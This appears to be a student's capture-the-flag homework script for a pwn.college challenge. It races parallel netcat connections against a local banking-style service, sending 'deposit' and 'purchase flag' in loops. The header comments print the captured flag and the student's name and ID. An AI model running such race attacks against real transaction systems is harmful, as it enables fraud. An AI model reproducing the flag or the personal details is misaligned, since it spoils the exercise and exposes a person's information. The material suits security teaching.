#!/usr/bin/bash

# UID = 119362914
# Name = Sparsh Mehta
# PWNCLG = hutgrabber
#
# The main idea for this homewfork exercise is to perform a race condition attack by running 2 instances of the program separately using
# different, simultaneous netcat connections.
#
# Looking at the code, we can see that in order for the flag to appear, the deposit amount has to be more than 200. In order to do this
# I have used the first two netcat connections to use the deposit function of the binary.
#
# The thirs netcat connection is used to perform the purchase flag function that the binary provides. Upon disassembly in ghidra, we can
# also see that even though the first condition to get the flag is satisfied (having a minimum balance of 200), we still need to satisfy
# a third condition which is to use the purchase flag function. This only works when there is a balance of 200 in the account.
#
# I have tried run the same functions in a loop multiple times (1337 times to be precise) so that I can cause a race condition. In order
# for this to properly work, I have also used the "&" at the end to backgroun all processes.
#
# To print the flag the following command has to be run:
#   ./script.sh | grep "pwn"
#
# Output:
#   pwn.college{wFPR2aQ0Rydt9gyQWVPVO7uc0DJ.ddTO2QDLzEzN1QzW}
#   pwn.college{wFPR2aQ0Rydt9gyQWVPVO7uc0DJ.ddTO2QDLzEzN1QzW}
#   pwn.college{wFPR2aQ0Rydt9gyQWVPVO7uc0DJ.ddTO2QDLzEzN1QzW}

for i in $(seq 1 1337); do
	echo "deposit" | nc localhost 1337
done &

for i in $(seq 1 1337); do
	echo "deposit" | nc localhost 1337
done &

for i in $(seq 1 1337); do
	echo "purchase flag" | nc localhost 1337
done &
